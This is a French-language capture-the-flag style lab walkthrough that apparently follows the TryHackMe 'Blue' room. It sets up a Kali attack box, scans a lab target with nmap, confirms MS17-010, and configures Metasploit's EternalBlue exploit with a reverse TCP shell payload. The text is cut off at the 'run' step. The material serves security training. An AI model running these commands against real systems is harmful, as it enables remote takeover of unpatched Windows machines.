- Connectez-vous en SSH à votre poste d'attaque Kali
  (crédentiels fournis par l'instructeur)

```
sudo apt-get update
sudo apt-get install xrdp lxde-core lxde tigervnc-standalone-server -y
sudo nano /etc/xrdp/xrdp.ini
    max_bpp=16
sudo nano /etc/X11/Xwrapper.config
        allowed_users=ec2-user
sudo service xrdp start
sudo passwd kali 
```
- Connectez-vous en RDP à votre poste d'attaque Kali

- Pingez votre Machine THM

```
sudo apt install openvpn
ifconfig
sudo openvpn xixi.blue.ovpn&
ifconfig
```

- Quelle difference remarquez-vous dans ifconfig?

- Pingez à nouveau votre Machine THM
```
nmap -sV -vv --script vuln TARGET_IP
```


```diff
@@Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 07:20 UTC@@
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 07:20
Completed NSE at 07:20, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:20
Completed NSE at 07:20, 0.00s elapsed
Initiating Ping Scan at 07:20
Scanning 10.10.18.88 [2 ports]
Completed Ping Scan at 07:20, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:20
Completed Parallel DNS resolution of 1 host. at 07:20, 0.00s elapsed
Initiating Connect Scan at 07:20
Scanning ip-10-10-18-88.ec2.internal (10.10.18.88) [1000 ports]
Discovered open port 139/tcp on 10.10.18.88
Discovered open port 3389/tcp on 10.10.18.88
Discovered open port 445/tcp on 10.10.18.88
Discovered open port 135/tcp on 10.10.18.88
Discovered open port 49158/tcp on 10.10.18.88
Discovered open port 49160/tcp on 10.10.18.88
Discovered open port 49152/tcp on 10.10.18.88
Discovered open port 49153/tcp on 10.10.18.88
Discovered open port 49154/tcp on 10.10.18.88
Completed Connect Scan at 07:20, 2.53s elapsed (1000 total ports)
Initiating Service scan at 07:20
@@Scanning 9 services on ip-10-10-18-88.ec2.internal (10.10.18.88)@@
```

- Les ports ouverts nous renseignent sur le type d'applications qui tournent

https://www.upguard.com/blog/smb-port#:~:text=SMB%20is%20a%20network%20file,dialects%20that%20communicate%20over%20NetBIOS.

- Lister les vulnerabilités potentielles de ce type

```
ls -al /usr/share/nmap/scripts | grep -e "smb"
```

- Vulnerabilité à exploiter : 

    https://en.wikipedia.org/wiki/EternalBlue

- Vérifier le satut de la vulnérabilité sur la machine cible : 

```
nmap -sS -Pn -p 445 10.10.18.88 --script smb-vuln-ms17-010.nse
```

```diff
@@Host script results:@@
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```
- Comprendre la vulnérabilité pour préparer l'attaque : 

References:
       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/. 
       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx. 
       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143. 

### Menez l'attaque exploit

- Prise en main de Metasploit

```
msfconsole -h
```

```
msfconsole
```

```diff
                                     ____________
 @@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
 @@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
 @@[%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]@@
 @@[% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]@@
 @@[% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]@@
 @@[% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]@@
 @@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
 @@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
 @@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
 @@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@

```

```
msf6 > search eternalblue
```

```
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```


```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.30.2.112     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

- Quelles sont les options nécessaires pour la commande ?

```
set _OPTION_ _VALUE_
```

- Préparer le payload pour enclencher un reverse shell en tcp

```
set payload windows/x64/shell/reverse_tcp
```

- Lancez l'attaque

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
